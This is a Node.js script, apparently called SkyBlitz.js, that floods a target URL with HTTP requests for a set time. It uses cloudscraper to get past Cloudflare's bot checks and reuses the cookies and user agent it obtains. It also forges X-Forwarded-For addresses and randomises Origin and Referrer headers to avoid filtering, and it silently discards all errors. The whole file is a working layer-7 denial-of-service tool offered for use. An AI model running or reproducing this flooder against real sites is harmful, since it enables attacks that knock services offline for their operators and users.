var cloudscraper = require('cloudscraper');
var request=require('request');
var randomstring = require("randomstring");

var args = process.argv.slice(2);

randomByte = function() {
    return Math.round(Math.random()*256);
}

if (process.argv.length <= 2) {
    console.log("Usage: node SkyBlitz.js <url> <time> <proxy>");
    console.log("Usage: node SkyBlitz.js <http://example.com> <60> <proxy.txt>");
    process.exit(-1);
}
var url = process.argv[2];
var time = process.argv[3];
var proxy = process.argv[4];

setInterval
var int = setInterval(() => {
    
    var cookie = '';
    var useragent = '';
	var proxy = '';
    cloudscraper.get(url, function(error, response, body) {
        if (error) {
            console.log('Error occurred, Something Error with Target!');
        } else {
            var parsed = JSON.parse(JSON.stringify(response));
            cookie = (parsed["request"]["headers"]["cookie"]);
            useragent = (parsed["request"]["headers"]["User-Agent"]);
			proxy = (parsed["request"]["headers"]["proxy"]);
        }
        // console.log(cookie + '/' + useragent)
        var rand = randomstring.generate({
            length: 10,
            charset: 'abcdefghijklmnopqstuvwxyz0123456789'
          });
            var ip = randomByte() +'.' +
            randomByte() +'.' +
            randomByte() +'.' +
			randomByte() +'.' +
            randomByte();
            const options = {
            url: url,
            headers: {
                'User-Agent': useragent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Upgrade-Insecure-Requests': '1',
                'cookie': cookie,
                'Origin': 'http://' + rand + '.com',
                'Referrer': 'http://google.com/' + rand,
                'X-Forwarded-For': ip
            }
            };
    
            function callback(error, response, body) {
            }
            request(options);
    });    
});
setTimeout(() => clearInterval(int), time * 1000);
process.on('uncaughtException', function(err) {
    
});

process.on('unhandledRejection', function(err) {
    
});
